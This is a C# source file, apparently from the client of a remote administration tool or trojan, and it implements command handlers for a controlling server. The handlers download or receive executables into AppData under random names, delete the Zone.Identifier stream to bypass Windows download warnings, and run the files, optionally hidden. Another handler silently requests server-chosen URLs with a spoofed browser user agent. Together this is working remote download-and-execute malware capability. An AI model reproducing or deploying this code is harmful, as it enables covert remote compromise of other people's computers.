﻿using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleDoDownloadAndExecute(Packets.ServerPackets.DoDownloadAndExecute command,
            Client client)
        {
            new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);

            new Thread(() =>
            {
                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    FileHelper.GetRandomFilename(12, ".exe"));

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.URL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.SetStatus("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Downloaded File!").Execute(client);

                try
                {
                    NativeMethods.DeleteFile(tempFile + ":Zone.Identifier");

                    var bytes = File.ReadAllBytes(tempFile);
                    if (bytes[0] != 'M' && bytes[1] != 'Z')
                        throw new Exception("no pe file");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = command.RunHidden;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch
                {
                    NativeMethods.DeleteFile(tempFile);
                    new Packets.ClientPackets.SetStatus("Execution failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
            }).Start();
        }

        public static void HandleDoUploadAndExecute(Packets.ServerPackets.DoUploadAndExecute command, Client client)
        {
            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                command.FileName);

            try
            {
                command.IsValidExecuteFile();
                if (!command.CorrectFileType) throw new Exception("File type is not valid");

                FileSplit destFile = new FileSplit(filePath);

                if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                {
                    new Packets.ClientPackets.SetStatus(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
                        client);
                    return;
                }

                if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                {
                    NativeMethods.DeleteFile(filePath + ":Zone.Identifier");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = command.RunHidden;
                    startInfo.FileName = filePath;
                    Process.Start(startInfo);

                    new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
                }
            }
            catch (Exception ex)
            {
                NativeMethods.DeleteFile(filePath);
                new Packets.ClientPackets.SetStatus(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoVisitWebsite(Packets.ServerPackets.DoVisitWebsite command, Client client)
        {
            string url = command.URL;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                new Packets.ClientPackets.SetStatus("Visited Website").Execute(client);
            }
        }

        public static void HandleDoShowMessageBox(Packets.ServerPackets.DoShowMessageBox command, Client client)
        {
            new Thread(() =>
            {
                MessageBox.Show(null, command.Text, command.Caption,
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton),
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
            }).Start();

            new Packets.ClientPackets.SetStatus("Showed Messagebox").Execute(client);
        }
    }
}